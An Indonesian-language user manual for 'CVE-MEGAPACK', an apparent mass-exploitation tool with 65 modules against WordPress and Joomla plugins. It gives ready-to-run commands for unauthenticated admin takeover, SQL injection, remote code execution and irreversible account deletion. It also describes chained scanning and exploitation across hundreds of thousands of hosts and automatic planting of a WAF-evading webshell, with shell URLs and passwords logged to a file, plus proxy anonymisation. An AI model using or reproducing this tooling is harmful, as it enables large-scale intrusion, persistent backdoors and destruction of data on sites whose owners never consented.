# PANDUAN — MEGAPACK untuk operator

Panduan ini untuk **memakai** tool, bukan mengembangkan. Dari nol sampai exploit.

---

## 0. Tiga kalimat yang cukup

1. Jalankan `python3 mp.py` → menu angka. Tanpa hafal flag.
2. Scan dulu (`1`), baru exploit (`2`) setelah lihat hasilnya `VULN`.
3. Exploit selalu minta konfirmasi `ya` — tidak akan jalan tanpa itu.

---

## 1. Mulai: menu (cara paling mudah)

```bash
cd /home/fayrieren/CVE-MEGAPACK
python3 mp.py
```

```
   1) Scan        — satu profil, pilih modul (tidak memutasi)
   2) Exploit     — satu profil, pilih modul (mutasi, butuh konfirmasi)
   3) Profil      — target, token, kredensial, id record
   4) Modul       — daftar CVE yang tersedia
   5) Report      — tulis report agregat
   6) Mass        — daftar target × SEMUA modul
   0) Keluar
```

### Alur pertama kali (5 menit)

```
3 → n → namaprofil        # buat profil
  1 → http://target:8080  # isi target (boleh beberapa, pisah koma)
  0                        # simpan
1 → pilih profil → pilih modul → selesai   # SCAN, tidak mengubah apa pun
2 → profil sama → modul sama → ketik "ya"  # EXPLOIT setelah scan bilang VULN
```

Profil disimpan di `profil.json` — target/kredensial bertahan antar sesi.

---

## 2. Menu 1 — Scan (aman, tidak memutasi)

Pilih profil → daftar 65 modul muncul dengan nomor:

```
   [wordpress]
    1) CVE-2025-1128     Everest Forms <= 3.0.9.4 unauth arbitrary file   verified
   18) CVE-2025-2594     User Registration & Membership <= 4.1.2 unauth   verified
   [joomla_core]
   16) CVE-2025-22213    Joomla Core - Media Manager: ekstensi berkas     verified
   [joomla_ext]
   52) CVE-2026-67365    iCagenda <= 4.0.11 unauth SQL injection          verified
```

Cara memilih modul:

| Ketik | Arti |
|---|---|
| `0` (enter) | semua modul |
| `1` | per cluster (lalu ketik `wordpress` / `joomla_core` / `joomla_ext`) |
| `18` | satu modul |
| `16,18,52` | beberapa |
| `1-20` | rentang |

Hasil scan: satu baris per target per modul.

```
VULN   CVE-2025-2594  http://target  User Registration 4.1.2 — confirm_payment nopriv … nonce anonim tersedia di /pricing/ -> sesi user mana pun
CLEAN  CVE-2026-67365 http://target  mod_icagenda_calendar 4.0.14 — >= 4.0.12 …
SKIP   CVE-2025-22213 http://target  bukan Joomla
```

Arti tag: **VULN** = terdampak · **CLEAN** = versi sudah dipatch · **SKIP** = bukan
produk sasaran · **INFO** = perlu kredensial/parameter tambahan · **ERR**/**UNKNOWN**.

---

## 3. Menu 2 — Exploit (memutasi target)

Sama seperti scan, tapi **selalu** minta konfirmasi:

```
  target=1  modul=1  mode=EXPLOIT
  [!] mode EXPLOIT akan MEMUTASI target.
  ketik 'ya' untuk lanjut: ya
PWN   CVE-2025-2594  http://target  TAKEOVER: sesi login 'admin' didapat TANPA kredensial …
```

**PWN** = outcome terkontrol benar-benar tercapai (bukan "request 200"):
sesi login dibuka & `/wp-admin/users.php` 200, berkas `.php` dieksekusi, atau data
DB terbaca.

Butuh kredensial/parameter? Isi di menu 3 lebih dulu:

| Modul butuh | Isi di menu 3 |
|---|---|
| akun backend (22213, beberapa Joomla) | pilihan `4` kredensial |
| user ID target (2594) | pilihan `5` field-id |
| ID user yang dihapus (2594 mode delete) | pilihan `5` delete-user |
| plan membership / kontak / kategori | pilihan 5–7 |

---

## 4. Menu 3 — Profil (target & parameter)

```
1) target            — isi beberapa URL, pisah koma
2) file targets.txt  — pakai file (satu URL per baris, # = komentar)
3) token API Joomla
4) kredensial        — username + password backend
5) field-id / delete-user
6) contact-id
7) category-id / ext
8) threads / timeout
9) delay / proxy
```

Beberapa profil bisa dibuat (`n` saat memilih profil) — mis. `wp-lab`, `joomla-lab`,
`klienA`. 

---

## 5. Menu 6 — Mass (banyak target sekaligus)

```
6 → 1 (file targets.txt) atau 2 (tempel URL)
  → pilih cakupan modul: 1 semua / 2 Joomla Core / 3 Joomla Ext / 4 Joomla semua / 5 WordPress / 6 manual
  → mode: 1 scan / 2 exploit
  → threads
  → simpan ke file (opsional)
```

Untuk daftar besar (>200 target) diminta konfirmasi tambahan. Output satu baris
per temuan (`[+] VULN …`) plus ringkasan akhir.

**Daftar besar (ratusan ribu target):** mode ini otomatis streaming — temuan
dicetak dan ditulis ke file saat itu juga, bukan ditahan sampai akhir. Progres
tampil tiap 5% (atau 0,5 detik sekali di terminal). Angka "estimasi batas-atas"
memang sengaja tinggi: target mati gugur di pre-flight sehingga jauh lebih cepat
dalam praktik (terukur 6.000 target ≈ 0,2–0,4 menit pada 24 thread).

---

## 6. Menu 5 — Report

Menulis `MEGAPACK-report.md` (atau nama lain) berisi tabel semua modul: CVE, status,
kelas, CVSS, produk, rentang versi, ringkasan, dan path notes analisis.

---

## 6b. CHAIN — scan lalu exploit hanya yang VULN (paling efisien)

Mode ini menjawab pertanyaan "setelah tahu VULN, langsung exploit saja".
Dua fase, bukan satu:

```
FASE 1  scan semua modul, semua target      (tidak memutasi apa pun)
FASE 2  exploit HANYA (target, modul) yang FASE 1 bilang VULN/RCE
```

Sasaran yang tidak rentan **tidak pernah** dikirimi payload exploit. Operator juga
melihat daftar sasaran sebelum fase destruktif mulai.

**Pra-filter TCP (otomatis pada >50 target).** Sebelum satu pun modul berjalan,
semua target diuji dengan satu connect TCP paralel (asyncio). Host mati gugur di
situ — sekali — bukan menanggung timeout 45 modul. Terukur pada 20.000 host mati:

| | waktu | proyeksi 300k |
|---|---|---|
| tanpa pra-filter (conc 500) | 201 s | ~50 menit |
| pra-filter (conc 2000) | **11 s** | **~2,5 menit** |

Atur dengan `--preflight-threads N` (default 1000); matikan dengan `--no-preflight`.

**Hasil pra-filter disimpan otomatis** ke `<daftar>-alive.txt` (mis. `joomla-alive.txt`),
atau ke file `--preflight-out`. Untuk daftar besar, pakai pola dua tahap supaya tidak
mengulang pekerjaan bila run terputus:

```bash
# tahap 1 — saring saja (boleh diulang / ditinggal)
python3 mp.py --targets joomla.txt --cluster joomla --preflight-only

# tahap 2 — scan + exploit + shell, tanpa filter ulang
python3 mp.py --targets joomla-alive.txt --cluster joomla --chain \
    --i-know-what-im-doing -t 100 --auto-deploy --shell-out shell.txt --no-preflight
```

Kenapa dua tahap: pra-filter 300.000 target butuh puluhan menit (satu connect per
target, jaringan jadi plafon). Bila proses terputus di tengah, hasil tahap 1 tetap
tersimpan. Retry berlapis dipakai di dalam pra-filter agar host lambat tidak hilang
(terukur: satu pass cepat membuang 129 dari 176 host yang sebenarnya hidup).

```bash
# dari CLI
python3 mp.py --targets targets.txt --chain --i-know-what-im-doing -t 25 --timeout 12

# mode paralel: exploit per target begitu VULN ditemukan (hasil sama, urutan beda)
python3 mp.py --targets targets.txt --chain --chain-mode parallel --i-know-what-im-doing
```

Dari menu: `6` → sumber target → pilih klaster → **mode `3` = CHAIN**.

Hasil terukur (3 host lab, semua 65 modul):
`--exploit` biasa 96 request → `--chain` 83 request, verdict identik.

### 6b.1 Webshell otomatis + `shell.txt` (setiap RCE)

Setiap RCE yang mencapai outcome terkontrol bisa langsung ditanami **webshell 0xfay
milik kita** — payload disimpan base64 di berkas non-PHP + stub dekoder, jadi lolos
WAF yang mencocokkan signature isi berkas.

```bash
python3 mp.py --targets targets.txt --chain --i-know-what-im-doing \
    --deploy-shell --shell-out shell.txt
# atau otomatis untuk semua RCE:
python3 mp.py --targets targets.txt --auto-deploy --i-know-what-im-doing \
    --shell-out shell.txt
```

`shell.txt` ditulis satu baris per shell yang **terverifikasi hidup**:

```
TARGET<TAB>CVE<TAB>SHELL_URL<TAB>password=<pw><TAB>OK|UNVERIFIED
```

Buka `SHELL_URL` di browser → form password → masukkan `password` → dapat panel
(command exec, `?c=<cmd>`, `?ls=1&d=<dir>`, `?read=`, `?write=`, upload, `?php=`).
Cek cepat tanpa login: `SHELL_URL?id=1` → `0xfay-xxxx host user cwd`.

Modul yang punya jalur tanam shell: **CVE-2025-22213** (Media Manager copy),
**CVE-2026-48907** (JCE profiles.import), **CVE-2026-48908** (SP Page Builder).
Modul RCE lain tetap dicatat `url=` di evidence bila sink-nya mengembalikan URL shell.

Catatan operasional: shell di direktori temporer (mis. `/tmp`, `media/.../iconfont/<rand>/`)
bisa 404 setelah proses situs membersihkan direktori — tanam ulang bila perlu.
Webshell di `/images/` (22213) bersifat persisten.

---

## 7. Jalur CLI (untuk scripting / target tunggal)

Menu mencakup semuanya, tapi CLI lebih cepat untuk satu perintah:

```bash
# scan semua modul pada satu target
python3 mp.py -u http://target:8080

# scan satu CVE
python3 mp.py -u http://target --cve CVE-2025-2594

# mass scan → JSON
python3 mp.py --targets targets.txt --cluster wordpress -o hasil.json

# exploit (butuh DUA flag)
python3 mp.py --targets targets.txt --cve CVE-2025-2594 \
    --exploit --i-know-what-im-doing

# dengan kredensial backend
python3 mp.py -u http://target --cve CVE-2025-22213 \
    --username admin --password 'pw' --exploit --i-know-what-im-doing

# modul dengan ID target tertentu
python3 mp.py -u http://target --cve CVE-2025-2594 --field-id 5 \
    --exploit --i-know-what-im-doing

# DESTRUKTIF: hapus akun tanpa autentikasi (2594)
python3 mp.py -u http://target --cve CVE-2025-2594 --delete-user 5 \
    --exploit --i-know-what-im-doing
```

### Contoh tiga modul terbaru

```bash
# CVE-2025-22213 — Joomla Media Manager copy() → .php RCE (butuh akun backend)
python3 mp.py -u http://site --cve CVE-2025-22213 \
    --username admin --password 'pw' --exploit --i-know-what-im-doing
# -> PWN "RCE: berkas diubah menjadi <x>.php dan DIEKSEKUSI oleh server"

# CVE-2025-2594 — User Registration ≤4.1.2 unauth login → sesi admin
python3 mp.py -u http://site --cve CVE-2025-2594 --exploit --i-know-what-im-doing
# -> PWN "TAKEOVER: sesi login 'admin' didapat TANPA kredensial"

# CVE-2026-67365 — iCagenda ≤4.0.11 unauth SQLi
python3 mp.py -u http://site --cve CVE-2026-67365 --exploit --i-know-what-im-doing
# -> PWN "SQL injection unauth terkonfirmasi — database='xxx', MySQL 8.0.x, …"
```

---

## 8. Flag lengkap

| Flag | Fungsi |
|---|---|
| `-u URL` (boleh diulang) | target |
| `--targets FILE` | file target (satu per baris, `#` komentar) |
| `--cve ID` (boleh diulang) | batasi modul |
| `--cluster` | `wordpress` / `joomla_core` / `joomla_ext` / `joomla` |
| `--exploit --i-know-what-im-doing` | aktifkan mode memutasi (dua-duanya wajib) |
| `--chain --i-know-what-im-doing` | scan dulu, exploit hanya yang VULN |
| `--chain-mode serial\|parallel` | serial: dua fase (default); parallel: per target |
| `--username` / `--password` | kredensial backend |
| `--field-id N` | ID record/user target |
| `--delete-user N` | **DESTRUKTIF**: hapus user ID N (modul yang punya sink hapus) |
| `--membership N` | ID plan membership |
| `--contact-id` / `--category-id` / `--category-ext` | konteks modul Joomla |
| `--api-token` | token API Joomla |
| `-t N` | worker paralel (default 8) |
| `--delay S` | jeda antar-request per target |
| `--timeout S` | timeout request (default 20) |
| `--proxy URL` | lewat proxy (mis. SOCKS dari `~/tools/opsec.py`) |
| `-o FILE` | simpan hasil JSON |
| `--report [FILE]` | tulis report Markdown |
| `--list` | daftar 65 modul |
| `-q` / `-v` | senyap / verbose |
| `--verify-tls` | verifikasi sertifikat (default longgar) |

Target boleh tanpa skema: `127.0.0.1:8080` → `http://127.0.0.1:8080`
(hanya port 443/8443 yang otomatis `https://`).

---

## 9. Membaca output (jangan salah tafsir)

| Status | Arti | Boleh dipercaya? |
|---|---|---|
| `PWN` | outcome terkontrol: sesi admin terbuka / `.php` dieksekusi / data DB terbaca | ya, sudah diverifikasi objektif |
| `VULN` | versi rentan & jalur terlihat; exploit belum/tidak dijalankan | ya untuk "terdampak", bukan untuk "sudah dieksploitasi" |
| `CLEAN` | versi sudah dipatch | ya |
| `SKIP` | bukan produk itu (mis. modul WP di target Joomla) | ya, bukan masalah |
| `INFO` | versi rentan tetapi **prasyarat** tidak terpenuhi (shortcode/halaman tidak ada, nonce tidak terlihat, kredensial belum diisi) — bukan error | ya, artinya "belum bisa diputuskan, bukan gagal" |
| `ERR`/`UNKNOWN` | jaringan/parameter tak terduga, atau bug tool | jangan dipercaya, ulangi & laporkan |

Baris `- ` di bawah status = bukti mentah (versi, DB, tabel, marker). Selalu baca itu
sebelum memutuskan.

---

## 10. Keselamatan & kemurnian scan

- **Default detect-only.** Tidak ada yang termutasi tanpa `--exploit`
  **dan** `--i-know-what-im-doing`; di menu selalu ada konfirmasi `ya`.
- **Scan (`1`) dijamin nol-mutasi — terukur.** Audit 2026-11-09 menemukan tiga
  modul yang `check()`-nya menulis ke target (iCagenda membuat event, PageBuilderCK
  menulis `.css`+log, Pods memanggil `add_pod`); ketiganya sudah diganti oracle
  baca-saja. Bukti akhir: sweep 5 target Joomla (325 hasil) → `jos_icagenda_events`
  32→32, `bb.css` md5 identik; sweep 12 target WordPress (240 hasil) → `wp_posts`
  dan `wp_users` identik di 9 database. Detail: `notes/scan-purity-audit-2026-11-09.md`.
- **`--delete-user` menghapus akun nyata.** Tidak bisa dibatalkan. Pakai hanya
  kalau memang itu tujuannya.
- Modul 2594 mode ambil-sesi **tidak mengubah password**; ia hanya membuat cookie
  sesi di sisi kita.
- Modul 22213 menulis berkas uji lalu **menghapusnya sendiri** setelah verifikasi.
- Kalau ragu: jalankan `1` (scan) dulu. Scan tidak menulis apa pun.

---

## 11. Troubleshooting

| Gejala | Penyebab | Solusi |
|---|---|---|
| `[!] --exploit butuh --i-know-what-im-doing` | flag pengaman | tambahkan `--i-know-what-im-doing` |
| `[!] file targets tidak ditemukan` | path salah | cek path / pakai `-u` |
| semua `SKIP` | target bukan WordPress/Joomla, atau skema salah | cek `http://` vs `https://`, port |
| `INFO` di modul yang butuh akun | belum ada kredensial | isi menu 3 → 4 |
| `INFO` di 2594 | halaman shortcode membership tidak ada | nonce tidak tersedia; lapor sebagai temuan terbatas |
| `VULN` tapi exploit tidak `PWN` | prasyarat fitur kurang (mis. modul membership mati) | baca baris `- ` untuk pesan aslinya |
| lama di target mati | DNS/timeout | sudah gagal cepat (`SKIP host tidak terjangkau`); cek jaringan |
| daftar besar "diam" lama | (sebelum 2026-11-09) parse 300k target >5 menit | sudah dipatch: 300k target = 0,01 s; progres muncul tiap 5% |
| progres hanya `SKIP` semua | target memang mati / bukan WordPress-Joomla | cek beberapa host manual; `SKIP` bukan error |
| `INFO` + "versi manifest tidak terbaca" | manifest XML diblokir atau di path lain | verdict butuh `--exploit`; cek `/administrator/components/<ext>/<ext>.xml` |
| `UNKNOWN` masih muncul | sisa klasifikasi lama | audit 2026-11-09 mengubah prasyarat-kurang jadi `INFO`; kalau masih ada, laporkan |

---

## 12. Di mana detail teknisnya

- `notes/{CVE}-analysis.md` — akar masalah, diff patch, bukti lab, residual.
- `MEGAPACK-report.md` — tabel semua modul (regenerate: `python3 mp.py --report`).
- `modules/` — kode tiap modul (docstring di atas file = ringkasan CVE).
